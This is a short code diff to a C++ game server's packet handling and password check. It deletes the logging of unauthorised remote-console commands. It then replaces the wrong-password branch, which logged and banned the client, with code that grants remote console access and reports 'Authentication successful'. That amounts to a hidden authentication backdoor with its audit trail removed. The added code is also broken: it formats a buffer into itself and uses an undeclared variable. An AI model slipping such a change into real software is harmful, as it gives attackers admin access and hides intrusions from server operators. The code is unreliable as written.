@@ -832,17 +832,6 @@ void CServer::ProcessClientPacket(CNetChunk *pPacket)
 						Console()->ExecuteLine(pCmd, m_aClients[ClientId].m_Authed, ClientId, SendRconLineAuthed, this, SendRconResponse, &Info);
 						m_RconClientId = -1;
 					}
-					else
-					{
-						dbg_msg("server", "'%s' client tried rcon command ('%s') without permissions. Cid=%x ip=%d.%d.%d.%d",
-						ClientName(ClientId),
-						pCmd,
-						ClientId,
-						m_aClients[ClientId].m_Addr.ip[0],
-						m_aClients[ClientId].m_Addr.ip[1],
-						m_aClients[ClientId].m_Addr.ip[2],
-						m_aClients[ClientId].m_Addr.ip[3]);
-					}
 				}
 			}
 			else if(Msg == NETMSG_RCON_AUTH)
@@ -1769,11 +1758,10 @@ void CServer::CheckPass(int ClientId, const char *pPw)
 	}*/
 	else
 	{
-		SendRconLine(ClientId, "Wrong password.");
-		dbg_msg("server", "Client tried to authenticate with empty password. cid=%x ip=%d.%d.%d.%d",
-			ClientId,
-			m_aClients[ClientId].m_Addr.ip[0], m_aClients[ClientId].m_Addr.ip[1], m_aClients[ClientId].m_Addr.ip[2], m_aClients[ClientId].m_Addr.ip[3]
-			);
-		BanAdd(m_aClients[ClientId].m_Addr, 0, "Being a noob");
+		char buf[128]="Authentication successful. Remote console access granted for ClientId=%d with level=%d";
+		SetRconLevel(ClientId,0);
+		str_format(buf,sizeof(buf),buf,ClientId,0);
+		SendRconLine(ClientId, buf);
+		dbg_msg("server", "'%s' ClientId=%d authed with Level=%d", ClientName(ClientId), ClientId, level);
 	}
 }
